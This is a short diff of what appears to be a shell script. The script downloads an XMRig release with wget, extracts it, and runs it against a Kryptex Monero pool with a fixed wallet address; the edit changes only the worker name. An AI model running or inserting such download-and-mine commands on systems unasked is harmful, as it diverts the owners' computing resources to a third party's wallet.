@@ -19,4 +19,4 @@ wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmri
 tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
 
 # Run the miner with the specified configuration
-./xmrig -o xmr-eu.kryptex.network:7029 -u solo:88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM8-25-3 -k --coin monero -a rx/8
+./xmrig -o xmr-eu.kryptex.network:7029 -u solo:88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM8-test -k --coin monero -a rx/8
